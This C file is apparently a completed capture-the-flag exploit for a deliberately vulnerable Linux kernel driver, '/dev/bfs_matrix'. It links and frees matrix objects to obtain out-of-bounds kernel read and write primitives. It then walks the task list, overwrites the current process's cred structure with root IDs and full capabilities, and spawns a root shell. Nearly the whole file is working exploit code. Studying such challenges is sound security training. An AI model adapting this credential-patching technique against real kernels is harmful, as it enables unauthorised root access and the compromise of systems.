#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <err.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <unistd.h>

#define DEVICE_NAME "/dev/bfs_matrix"

#define MAX_MATRIX_NAME 16

#define IOCTL_MATRIX_SET_NAME _IOWR('s', 1, void*)
#define IOCTL_MATRIX_GET_NAME _IOWR('s', 2, void*)
#define IOCTL_MATRIX_GET_INFO _IOWR('s', 3, struct matrix_info)
#define IOCTL_MATRIX_SET_INFO _IOWR('s', 4, struct matrix_info)
#define IOCTL_MATRIX_GET_POS  _IOWR('s', 5, struct matrix_pos)
#define IOCTL_MATRIX_SET_POS  _IOWR('s', 6, struct matrix_pos)
#define IOCTL_MATRIX_DO_LINK  _IOWR('s', 7, int)

// global vars
uint64_t task_struct, fd3_addr;
int fd1,fd2,fd3,fd4,fd5;

struct matrix_info
{
  int rows;
  int cols;
};

struct matrix_pos
{
  int row;
  int col;
  uint8_t byte;
};

// Undefine this if you don't want debug trazes
#define DEBUG 1

#ifdef DEBUG
#define DBG_PRINT(...)  do { fprintf(stderr, __VA_ARGS__); } while (0)
#else
#define DBG_PRINT(...)  do { } while (0)
#endif

// ----------------------------------------------------------------------------
// Exploit primitives, you need to fill them!

uint64_t kread64(uint64_t addr);
void kwrite64(uint64_t addr, uint64_t value);

// ----------------------------------------------------------------------------
// Helper functions for the exploit

uint32_t kread32(uint64_t addr)
{
  return kread64(addr);
}

void kwrite32(uint64_t addr, uint32_t value)
{
  uint32_t hi_dword = kread64(addr) >> 32;
  kwrite64(addr, ((uint64_t) hi_dword << 32) | value);
}

// Given a task structure address, patches its credentials.
void patch_creds(uint64_t task_struct)
{
#define DELTA_CREDS 0x498
  uint64_t task_creds = kread64(task_struct + DELTA_CREDS);

  struct cred
  {
    uint32_t usage;
    uint32_t uid;             /* real UID of the task */
    uint32_t gid;             /* real GID of the task */
    uint32_t suid;            /* saved UID of the task */
    uint32_t sgid;            /* saved GID of the task */
    uint32_t euid;            /* effective UID of the task */
    uint32_t egid;            /* effective GID of the task */
    uint32_t fsuid;           /* UID for VFS ops */
    uint32_t fsgid;           /* GID for VFS ops */
    uint32_t securebits;      /* SUID-less security management */
    uint64_t cap_inheritable; /* caps our children can inherit */
    uint64_t cap_permitted;	  /* caps we're permitted */
    uint64_t cap_effective;	  /* caps we can actually use */
    uint64_t cap_bset;	      /* capability bounding set */
  };

#define GLOBAL_ROOT_UID     0
#define GLOBAL_ROOT_GID     0
#define SECURE_BITS_DEFAULT 0
#define CAP_EMPTY_SET       0
#define CAP_FULL_SET        -1

  kwrite32(task_creds + offsetof(struct cred, uid),   GLOBAL_ROOT_UID);
  kwrite32(task_creds + offsetof(struct cred, gid),   GLOBAL_ROOT_GID);
  kwrite32(task_creds + offsetof(struct cred, suid),  GLOBAL_ROOT_UID);
  kwrite32(task_creds + offsetof(struct cred, sgid),  GLOBAL_ROOT_GID);
  kwrite32(task_creds + offsetof(struct cred, euid),  GLOBAL_ROOT_UID);
  kwrite32(task_creds + offsetof(struct cred, egid),  GLOBAL_ROOT_GID);
  kwrite32(task_creds + offsetof(struct cred, fsuid), GLOBAL_ROOT_UID);
  kwrite32(task_creds + offsetof(struct cred, fsgid), GLOBAL_ROOT_GID);
  kwrite32(task_creds + offsetof(struct cred, securebits), SECURE_BITS_DEFAULT);
  kwrite64(task_creds + offsetof(struct cred, cap_inheritable), CAP_EMPTY_SET);
  kwrite64(task_creds + offsetof(struct cred, cap_permitted),   CAP_FULL_SET);
  kwrite64(task_creds + offsetof(struct cred, cap_effective),   CAP_FULL_SET);
  kwrite64(task_creds + offsetof(struct cred, cap_bset),        CAP_FULL_SET);

  DBG_PRINT("[+] patched credentials %lx (task=%lx)\n", task_creds, task_struct);
}

// Receives the kernel base address and returns the task structure of the
// current task.
uint64_t lookup_current_task(uint64_t kbase)
{
  char new_task_name[] = "bfs_findme";

  if (prctl(PR_SET_NAME, new_task_name, 0, 0, 0) < 0)
    errx(1, "couldn't set new task name");

#define DELTA_INIT_TASK 0xa26600
  uint64_t init_task = kbase + DELTA_INIT_TASK;

#define DELTA_COMM  0x4a0
#define DELTA_TASKS 0x230

  uint64_t current_task = init_task;

  do
  {
    char task_name[17] = {0};

    *(uint64_t*) &task_name[0] = kread64(current_task + DELTA_COMM);
    *(uint64_t*) &task_name[8] = kread64(current_task + DELTA_COMM + 8);

    printf("[*] %lx -> %s\n", current_task, task_name);

    if (! strcmp(task_name, new_task_name))
      return current_task;

    current_task = kread64(current_task + DELTA_TASKS) - DELTA_TASKS;

  } while (current_task != init_task);

  errx(1, "couldn't find current task");
}

// ----------------------------------------------------------------------------
// Interface for interacting with the driver

void matrix_do_link(int fd, int link_fd)
{
  if (ioctl(fd, IOCTL_MATRIX_DO_LINK, link_fd) < 0)
    errx(1, "couldn't link matrix\n");

  DBG_PRINT("[*] matrix linked\n");
}

uint8_t matrix_get_pos(int fd, int row, int col)
{
  struct matrix_pos pos = {0};

  pos.row = row;
  pos.col = col;

  if (ioctl(fd, IOCTL_MATRIX_GET_POS, &pos) < 0)
    errx(1, "couldn't get matrix pos");

  DBG_PRINT("[*] matrix pos: matrix[%04d][%04d]=%02x\n", row, col, pos.byte);

  return pos.byte;
}

void matrix_set_pos(int fd, int row, int col, uint8_t value)
{
  struct matrix_pos pos = {0};

  pos.row = row;
  pos.col = col;
  pos.byte = value;

  if (ioctl(fd, IOCTL_MATRIX_SET_POS, &pos) < 0)
    errx(1, "couldn't set matrix pos");

  DBG_PRINT("[*] updated matrix pos: matrix[%04d][%04d]=%02x\n", row, col, value);
}

struct matrix_info matrix_get_info(int fd)
{
  struct matrix_info info = {0};

  if (ioctl(fd, IOCTL_MATRIX_GET_INFO, &info) < 0)
    errx(1, "couldn't get matrix info");

  DBG_PRINT("[*] matrix info: rows=%d columns=%d\n", info.rows, info.cols);

  return info;
}

void matrix_set_info(int fd, int rows, int cols)
{
  struct matrix_info info = {0};

  info.rows = rows;
  info.cols = cols;

  if (ioctl(fd, IOCTL_MATRIX_SET_INFO, &info) < 0)
    errx(1, "couldn't set matrix info");

  DBG_PRINT("[*] matrix info updated to: rows=%d columns=%d\n", rows, cols);
}

char* matrix_get_name(int fd)
{
  char name[MAX_MATRIX_NAME+1] = {0};

  if (ioctl(fd, IOCTL_MATRIX_GET_NAME, name) < 0)
    errx(1, "couldn't get matrix name");

  DBG_PRINT("[*] matrix name: %s\n", name);

  return strdup(name);
}

void matrix_set_name(int fd, char* name)
{
  if (ioctl(fd, IOCTL_MATRIX_SET_NAME, name) < 0)
    errx(1, "couldn't set matrix name");

  DBG_PRINT("[*] matrix name updated\n");
}

int matrix_new()
{
  int fd = open(DEVICE_NAME, O_RDWR);
  if (fd < 0)
    errx(1, "couldn't open device");

  DBG_PRINT("[*] new matrix fd: %d\n", fd);

  return fd;
}

// ----------------------------------------------------------------------------
// Exploit begins here

uint64_t kread64(uint64_t addr)
{
int i;
uint64_t val;
	
	// set fd3 data pt to addr
	kwrite64(fd3_addr + 8, addr);
	// read addr 
	for (i=0, val=0; i<8; i++)
		val |= (uint64_t)matrix_get_pos(fd3,i,0)<<(i<<3);
	return (val);
}

void kwrite64(uint64_t addr, uint64_t value)
{
int i;
	// set data ptr in fd2
	for (i=0; i<8; i++)
		matrix_set_pos(fd4,i,1, (uint8_t)(addr>>(i<<3))&0xff );
	// write value in addr
	for (i=0; i<8; i++)
		matrix_set_pos(fd1,i,0, (uint8_t)(value>>(i<<3))&0xff );
}

int main(int argc, char* argv[argc+1])
{
int i;

	fd1 =  matrix_new();
	fd2 =  matrix_new();
	fd3 =  matrix_new();
	fd4 =  matrix_new();
	fd5 =  matrix_new();

	// interleave 4 matrices
	matrix_do_link(fd1,fd2);
	matrix_do_link(fd2,fd3);
	matrix_do_link(fd3,fd4);
	matrix_do_link(fd4,fd5);

	close(fd2);
	matrix_set_info(fd5,8,8);

	// change size of msg for oob read to max 0xfd0
	for (i=0, task_struct=0; i<8; i++)
		task_struct |= (uint64_t)matrix_get_pos(fd5,i,5)<<(i<<3);
	printf("task_struct = 0x%llx\n", task_struct);

	// calculate address of fd3
	for (i=0, fd3_addr=0; i<8; i++)
		fd3_addr |= (uint64_t)matrix_get_pos(fd5,i,4)<<(i<<3);
	fd3_addr -= 0xc0;
	printf("fd3_addr = 0x%llx\n", fd3_addr);

	patch_creds(task_struct);
 
	// got shell
	setgid(0);
	setuid(0);
	system("/bin/sh");

 return EXIT_SUCCESS;
}

